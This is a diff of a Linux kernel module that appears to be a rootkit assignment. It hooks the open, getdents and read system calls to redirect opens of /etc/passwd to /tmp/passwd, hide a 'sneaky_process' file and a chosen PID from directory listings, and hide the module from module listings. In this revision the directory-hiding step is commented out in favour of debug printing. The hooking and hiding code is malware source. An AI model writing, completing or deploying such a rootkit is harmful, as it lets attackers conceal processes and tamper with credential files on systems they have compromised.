@@ -9,8 +9,6 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 #include <linux/moduleparam.h>
-
-//#include <linux/stdlib.h>
 #include <linux/string.h>
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
@@ -24,12 +22,13 @@ char * pid;
 module_param(pid, charp, 0000);
 
 struct linux_dirent {
-  u64            d_ino;
-  s64            d_off;
+  long            d_ino;
+  off_t           d_off;
   unsigned short d_reclen;
-  char           d_name[32];
-  char           d_type;
+  char           d_name[];
 };
+
+int flag=0;
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -52,9 +51,10 @@ asmlinkage int (*original_open)(const char *pathname, int flags);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 asmlinkage size_t (*original_read)(int fd, void *buf, size_t count);
 
+
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags){
-  printk(KERN_INFO "Very, very Sneaky!\n");
+  //printk(KERN_INFO "sneaky open\n");
   if(strcmp(pathname, "/etc/passwd")==0){
     copy_to_user(pathname, "/tmp/passwd", 12);
   }
@@ -62,24 +62,35 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags){
 }
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count){
+  //printk(KERN_INFO "sneaky getdents\n");
   int nread = original_getdents(fd, dirp, count);
   struct linux_dirent * d;
-  struct linux_dirent * p;
+  //struct linux_dirent * p;
   int bpos;
-  for(bpos=0; bpos<nread; bpos+=d->d_reclen){
+  char d_type;
+  int i=0;
+  
+  printk(KERN_INFO "nread: %d\n",nread);
+  for(bpos=0; bpos<nread && i<10; bpos+=d->d_reclen,i++){
     d = (struct linux_dirent *) (dirp + bpos);
-    if((strcmp(d->d_name, "sneaky_process") == 0 && d->d_type==DT_REG) ||
-       (strcmp(d->d_name, pid) == 0 && d->d_type==DT_DIR)){
-      p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
+    //d_type = *(char*)(dirp + bpos + d->d_reclen - 1);
+    printk(KERN_INFO "i: %d, bpos: %d, reclen: %d, name: %s\n",i,bpos,d->d_reclen,d->d_name);
+    if((strcmp(d->d_name, "sneaky_process") == 0) ||
+       (strcmp(d->d_name, pid) == 0)){
+      printk(KERN_INFO "d->d_name: %s\n", d->d_name);
+      //memmove(d, (struct linux_dirent *) (d + d->d_reclen), nread - bpos - d->d_reclen);
+      //return nread - d->d_reclen;
+      //p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
     }
-    p=d;
+    //p=d;
   }
+
   return nread;
 }
 
 asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
+  //printk(KERN_INFO "sneaky read\n");
   size_t nread = original_read(fd, buf, count);
-  //buf = (char*) buf;
   char name[] = "sneaky_mod ";
   int i, j;
   int line_start = 1;
@@ -173,7 +184,6 @@ static void exit_sneaky_module(void)
   write_cr0(read_cr0() | 0x10000);
 }  
 
-MODULE_LICENSE("wy47");
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
 
